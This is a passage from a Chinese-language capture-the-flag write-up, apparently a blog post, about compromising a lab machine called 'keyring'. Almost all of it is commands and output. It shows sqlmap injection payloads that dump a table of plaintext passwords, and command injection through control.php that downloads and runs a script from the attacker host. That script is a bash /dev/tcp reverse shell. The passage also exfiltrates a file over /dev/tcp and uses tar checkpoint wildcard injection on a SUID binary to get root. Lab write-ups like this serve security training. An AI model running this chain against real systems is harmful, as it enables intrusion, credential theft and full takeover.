MySQL &gt;= 5.0.12 <span class="keyword">AND</span> time-based blind (query SLEEP)</span><br><span class="line">    Payload: <span class="attribute">user</span>=kakeru&#x27; <span class="keyword">AND</span> (SELECT 9710 <span class="keyword">FROM</span> (SELECT(SLEEP(5)))Gxfh) <span class="keyword">AND</span> <span class="string">&#x27;flol&#x27;</span>=<span class="string">&#x27;flol</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 1 column</span></span><br><span class="line"><span class="string">    Payload: user=kakeru&#x27;</span> UNION ALL SELECT CONCAT(0x7178787871,0x65647271467a6477744472684547474a74614e4e59464276706668634d4f4d5576495a45414a6b72,0x717a6a7a71)-- -</span><br><span class="line">---</span><br><span class="line">[20:55:57] [<span class="built_in">INFO</span>] the back-end DBMS is MySQL</span><br><span class="line">web<span class="built_in"> server </span>operating system: Linux Ubuntu 18.04 (bionic)</span><br><span class="line">web application technology: Apache 2.4.29</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[20:55:57] [<span class="built_in">INFO</span>] fetching tables <span class="keyword">for</span> database: <span class="string">&#x27;users&#x27;</span></span><br><span class="line">[20:55:58] [<span class="built_in">WARNING</span>] reflective value(s) found <span class="keyword">and</span> filtering out</span><br><span class="line">Database:<span class="built_in"> users</span></span><br><span class="line"><span class="built_in"></span>[2 tables]</span><br><span class="line">+---------+</span><br><span class="line">| log     |</span><br><span class="line">| details |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">[20:55:58] [<span class="built_in">INFO</span>] fetched data logged <span class="keyword">to</span> text files under <span class="string">&#x27;/root/.local/share/sqlmap/output/192.168.240.230&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 20:55:57 /2025-02-06/</span><br><span class="line"></span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# sqlmap -u 192.168.240.230/history.php?<span class="attribute">user</span>=kakeru <span class="attribute">--cookie</span>=<span class="string">&quot;PHPSESSID=fe7jj1h3ab3nh81dubr28mim8g&quot;</span> --batch -D<span class="built_in"> users </span>-T details --columns --dump</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.8.12#stable&#125;</span><br><span class="line">|_ -| . [<span class="string">&quot;]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [,]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   https://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 20:56:16 /2025-02-06/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[20:56:16] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[20:56:16] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: user (GET)</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: user=kakeru&#x27; AND (SELECT 9710 FROM (SELECT(SLEEP(5)))Gxfh) AND &#x27;flol&#x27;=&#x27;flol</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 1 column</span></span><br><span class="line"><span class="string">    Payload: user=kakeru&#x27; UNION ALL SELECT CONCAT(0x7178787871,0x65647271467a6477744472684547474a74614e4e59464276706668634d4f4d5576495a45414a6b72,0x717a6a7a71)-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[20:56:16] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">web server operating system: Linux Ubuntu 18.04 (bionic)</span></span><br><span class="line"><span class="string">web application technology: Apache 2.4.29</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[20:56:16] [INFO] fetching columns for table &#x27;details&#x27; in database &#x27;users&#x27;</span></span><br><span class="line"><span class="string">[20:56:16] [WARNING] reflective value(s) found and filtering out</span></span><br><span class="line"><span class="string">Database: users</span></span><br><span class="line"><span class="string">Table: details</span></span><br><span class="line"><span class="string">[2 columns]</span></span><br><span class="line"><span class="string">+----------+-------------+</span></span><br><span class="line"><span class="string">| Column   | Type        |</span></span><br><span class="line"><span class="string">+----------+-------------+</span></span><br><span class="line"><span class="string">| name     | varchar(20) |</span></span><br><span class="line"><span class="string">| password | varchar(22) |</span></span><br><span class="line"><span class="string">+----------+-------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[20:56:16] [INFO] fetching columns for table &#x27;details&#x27; in database &#x27;users&#x27;</span></span><br><span class="line"><span class="string">[20:56:16] [INFO] fetching entries for table &#x27;details&#x27; in database &#x27;users&#x27;</span></span><br><span class="line"><span class="string">Database: users</span></span><br><span class="line"><span class="string">Table: details</span></span><br><span class="line"><span class="string">[3 entries]</span></span><br><span class="line"><span class="string">+--------+-----------------------+</span></span><br><span class="line"><span class="string">| name   | password              |</span></span><br><span class="line"><span class="string">+--------+-----------------------+</span></span><br><span class="line"><span class="string">| admin  | myadmin#p4szw0r4d     |</span></span><br><span class="line"><span class="string">| john   | Sup3r<span class="variable">$S3cr3t</span><span class="variable">$PasSW0RD</span> |</span></span><br><span class="line"><span class="string">| kakeru | kakeru                |</span></span><br><span class="line"><span class="string">+--------+-----------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[20:56:16] [INFO] table &#x27;users.details&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/192.168.240.230/dump/users/details.csv&#x27;</span></span><br><span class="line"><span class="string">[20:56:16] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.240.230&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 20:56:16 /2025-02-06/</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></div>
<p>获取到admin密码之后登录，然后在control.php这里用?cmdcntr执行命令反弹webshell<br>我先试了nc的反弹shell，但是不行，所以上传一个反弹shell的php</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="keyword">cp</span> /usr/share/webshells/php/php-<span class="built_in">reverse</span>-<span class="keyword">shell</span>.php .        </span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="keyword">ls</span></span><br><span class="line"><span class="number">51224</span>.<span class="keyword">py</span>  aaa    <span class="keyword">b</span>    <span class="keyword">b</span>.txt  id_rsa    php-<span class="built_in">reverse</span>-<span class="keyword">shell</span>.php  reports     rockyou.txt</span><br><span class="line"><span class="keyword">a</span>         <span class="keyword">a</span>.txt  bbb  id     pass.txt  pspy64                 <span class="built_in">reverse</span>.<span class="keyword">sh</span>  tmp</span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="keyword">python3</span> -<span class="keyword">m</span> http.server <span class="number">80</span></span><br><span class="line">Serving HTTP <span class="keyword">on</span> <span class="number">0.0</span>.<span class="number">0.0</span> port <span class="number">80</span> (http://<span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">80</span>/) ...</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>但是这样虽然接收到了，但是不知道接收之后的路径，也没法弹shell<br>我一开始用php-reverse-shell.php,一直没成功访问到路径，后面经过群主提醒，直接用php就可以执行。<br>还可以先输入命令ls -al看看权限<br>那就用reverse.sh来反弹shell 写到&#x2F;tmp目录中，当前目录一般都是root创的没有权限</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.240.230</span>/control.php?cmdcntr=wget%<span class="number">20192</span>.<span class="number">168</span>.<span class="number">240</span>.<span class="number">11</span>/reverse.sh%<span class="number">20</span>-O%<span class="number">20</span>/tmp/re.sh</span><br><span class="line"><span class="attribute">http</span>://<span class="number">192.168.240.230</span>/control.php?cmdcntr=bash%<span class="number">20</span>/tmp/re.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">                                                                                                                  </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># cat reverse.sh                                                            </span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">192.168</span>.<span class="number">240.11</span>/<span class="number">1234</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># nc -lp 1234</span></span><br><span class="line">id</span><br><span class="line">pwd</span><br><span class="line"><span class="symbol">bash:</span> cannot set terminal process group (<span class="number">627</span>): <span class="title class_">Inappropriate</span> ioctl <span class="keyword">for</span> device</span><br><span class="line"><span class="symbol">bash:</span> no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span>id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span>pwd</span><br><span class="line">/var/www/html</span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span></span><br></pre></td></tr></table></figure></div>
<p>美化终端：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">script -qc /bin/bash /dev/null</span><br><span class="line">ctrl + z挂起</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">reset</span><br><span class="line">xterm</span><br><span class="line">本机<span class="built_in">stty</span> -a 查看自己的  rows columns</span><br><span class="line"><span class="built_in">stty</span>  rows 35 columns 115</span><br></pre></td></tr></table></figure></div>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>sudo 和 suid都没有可以利用的</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span>sudp -l</span><br><span class="line"></span><br><span class="line"><span class="title class_">Command</span> <span class="string">&#x27;sudp&#x27;</span> <span class="keyword">not</span> found, did you <span class="symbol">mean:</span></span><br><span class="line"></span><br><span class="line">  command <span class="string">&#x27;ssdp&#x27;</span> from snap ssdp</span><br><span class="line">  command <span class="string">&#x27;sfdp&#x27;</span> from deb graphviz</span><br><span class="line">  command <span class="string">&#x27;sup&#x27;</span> from deb sup</span><br><span class="line">  command <span class="string">&#x27;sudo&#x27;</span> from deb sudo</span><br><span class="line">  command <span class="string">&#x27;sudo&#x27;</span> from deb sudo-ldap</span><br><span class="line"></span><br><span class="line"><span class="title class_">See</span> <span class="string">&#x27;snap info &lt;snapname&gt;&#x27;</span> <span class="keyword">for</span> additional versions.</span><br><span class="line"></span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span>sudo -l</span><br><span class="line"></span><br><span class="line"><span class="title class_">We</span> trust you have received the usual lecture from the local <span class="title class_">System</span></span><br><span class="line"><span class="title class_">Administrator</span>. <span class="title class_">It</span> usually boils down to these three <span class="symbol">things:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#1) Respect the privacy of others.</span></span><br><span class="line">    <span class="comment">#2) Think before you type.</span></span><br><span class="line">    <span class="comment">#3) With great power comes great responsibility.</span></span><br><span class="line"></span><br><span class="line">[sudo] password <span class="keyword">for</span> www-<span class="symbol">data:</span> </span><br><span class="line"></span><br><span class="line">^C</span><br><span class="line"></span><br><span class="line"><span class="symbol">sudo:</span> <span class="number">1</span> incorrect password attempt</span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span></span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span></span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span></span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/var/www/html</span><span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/lib/policykit-<span class="number">1</span>/polkit-agent-helper-<span class="number">1</span></span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-<span class="number">1.0</span>/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/bin/ntfs-3g</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/su</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>去home目录下面，发现有一个john用户，刚才sqlmap也有这个用户！<br>可以切换到这个用户</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/</span><span class="variable">$ </span>cd home</span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/home</span><span class="variable">$ </span>ls</span><br><span class="line">john</span><br><span class="line">www-data<span class="variable">@keyring</span><span class="symbol">:/home</span><span class="variable">$ </span>su - john</span><br><span class="line"><span class="symbol">Password:</span> </span><br><span class="line"><span class="title class_">To</span> run a command as administrator (user <span class="string">&quot;root&quot;</span>), <span class="keyword">use</span> <span class="string">&quot;sudo &lt;command&gt;&quot;</span>.</span><br><span class="line"><span class="title class_">See</span> <span class="string">&quot;man sudo_root&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">john<span class="variable">@keyring</span><span class="symbol">:~</span><span class="variable">$ </span></span><br></pre></td></tr></table></figure></div>
<p>发现john自己目录下的一个文件有suid</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">john<span class="variable">@keyring</span>:~<span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/home/john</span><span class="regexp">/compress</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/snapd</span><span class="regexp">/snap-confine</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/x</span>86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/policykit-1/polkit</span>-agent-helper-<span class="number">1</span></span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/openssh/ssh</span>-keysign</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/dbus-1.0/dbus</span>-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/eject/dmcrypt</span>-get-device</span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chsh</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/traceroute</span>6.iputils</span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/passwd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newuidmap</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/sudo</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newgrp</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/pkexec</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newgidmap</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chfn</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/gpasswd</span></span><br><span class="line"><span class="regexp">/bin/ntfs</span>-<span class="number">3</span>g</span><br><span class="line"><span class="regexp">/bin/umount</span></span><br><span class="line"><span class="regexp">/bin/mount</span></span><br><span class="line"><span class="regexp">/bin/ping</span></span><br><span class="line"><span class="regexp">/bin/fusermount</span></span><br><span class="line"><span class="regexp">/bin/su</span></span><br></pre></td></tr></table></figure></div>
<p>这个是个可执行文件，但是我又卡住了<br>看了视频，知道用string看这个文件就可以了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># nc -lp 1234 &gt; compress</span></span><br><span class="line"></span><br><span class="line">john<span class="variable">@keyring</span><span class="symbol">:~</span><span class="variable">$ </span>cat compress &gt; /dev/tcp/<span class="number">192.168</span>.<span class="number">240.11</span>/<span class="number">1234</span></span><br><span class="line">john<span class="variable">@keyring</span><span class="symbol">:~</span><span class="variable">$ </span></span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># strings compress             </span></span><br><span class="line">/lib64/ld-linux-x86<span class="number">-64</span>.so.<span class="number">2</span></span><br><span class="line">libc.so.<span class="number">6</span></span><br><span class="line">setuid</span><br><span class="line">system</span><br><span class="line">__cxa_finalize</span><br><span class="line">setgid</span><br><span class="line">__libc_start_main</span><br><span class="line"><span class="title class_">GLIBC_2</span>.<span class="number">2.5</span></span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">__gmon_start__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">u+<span class="title class_">UH</span></span><br><span class="line">[]A\A]A^<span class="title class_">A_</span></span><br><span class="line">/bin/tar cf archive.tar *</span><br><span class="line"><span class="symbol">:*</span><span class="number">3</span><span class="variable">$&quot;</span></span><br><span class="line"><span class="symbol">GCC:</span> (<span class="title class_">Ubuntu</span> <span class="number">9.3</span>.<span class="number">0</span><span class="number">-17</span>ubuntu1~<span class="number">20.04</span>) <span class="number">9.3</span>.<span class="number">0</span></span><br><span class="line">crtstuff.c</span><br><span class="line">deregister_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">completed.<span class="number">8060</span></span><br><span class="line">__do_global_dtors_aux_fini_array_entry</span><br><span class="line">frame_dummy</span><br><span class="line">__frame_dummy_init_array_entry</span><br><span class="line">tar.c</span><br><span class="line">__FRAME_END__</span><br><span class="line">__init_array_end</span><br><span class="line">_DYNAMIC</span><br><span class="line">__init_array_start</span><br><span class="line">__GNU_EH_FRAME_HDR</span><br><span class="line">_GLOBAL_OFFSET_TABLE_</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">_edata</span><br><span class="line">system<span class="variable">@@GLIBC_2</span>.<span class="number">2.5</span></span><br><span class="line">__libc_start_main<span class="variable">@@GLIBC_2</span>.<span class="number">2.5</span></span><br><span class="line">__data_start</span><br><span class="line">__gmon_start__</span><br><span class="line">__dso_handle</span><br><span class="line">_IO_stdin_used</span><br><span class="line">__libc_csu_init</span><br><span class="line">__bss_start</span><br><span class="line">main</span><br><span class="line">setgid<span class="variable">@@GLIBC_2</span>.<span class="number">2.5</span></span><br><span class="line">__TMC_END__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">setuid<span class="variable">@@GLIBC_2</span>.<span class="number">2.5</span></span><br><span class="line">__cxa_finalize<span class="variable">@@GLIBC_2</span>.<span class="number">2.5</span></span><br><span class="line">.symtab</span><br><span class="line">.strtab</span><br><span class="line">.shstrtab</span><br><span class="line">.interp</span><br><span class="line">.note.gnu.property</span><br><span class="line">.note.gnu.build-id</span><br><span class="line">.note.<span class="title class_">ABI</span>-tag</span><br><span class="line">.gnu.hash</span><br><span class="line">.dynsym</span><br><span class="line">.dynstr</span><br><span class="line">.gnu.version</span><br><span class="line">.gnu.version_r</span><br><span class="line">.rela.dyn</span><br><span class="line">.rela.plt</span><br><span class="line">.init</span><br><span class="line">.plt.got</span><br><span class="line">.plt.sec</span><br><span class="line">.text</span><br><span class="line">.fini</span><br><span class="line">.rodata</span><br><span class="line">.eh_frame_hdr</span><br><span class="line">.eh_frame</span><br><span class="line">.init_array</span><br><span class="line">.fini_array</span><br><span class="line">.dynamic</span><br><span class="line">.data</span><br><span class="line">.bss</span><br><span class="line">.comment</span><br></pre></td></tr></table></figure></div>
<p>主要是用到了<code>/bin/tar cf archive.tar *</code> 我们运行之后目录下就会出现archive.tar<br>在gifobins找到利用方式<br><img src="https://pic1.imgdb.cn/item/67a4c7dbd0e0a243d4fc5424.png"><br>创建两个文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">john<span class="variable">@keyring</span><span class="symbol">:~</span><span class="variable">$ </span>wget <span class="number">192.168</span>.<span class="number">240.11</span>/reverse.sh </span><br><span class="line">john<span class="variable">@keyring</span><span class="symbol">:~</span><span class="variable">$ </span>touch -- <span class="string">&quot;--checkpoint=1&quot;</span></span><br><span class="line">john<span class="variable">@keyring</span><span class="symbol">:~</span><span class="variable">$ </span>touch -- <span class="string">&quot;--checkpoint-action=exec=bash  reverse.sh&quot;</span></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># nc -lp 1234           </span></span><br><span class="line">id</span><br><span class="line"><span class="title class_">To</span> run a command as administrator (user <span class="string">&quot;root&quot;</span>), <span class="keyword">use</span> <span class="string">&quot;sudo &lt;command&gt;&quot;</span>.</span><br><span class="line"><span class="title class_">See</span> <span class="string">&quot;man sudo_root&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">root<span class="variable">@keyring</span><span class="symbol">:~</span><span class="comment"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span 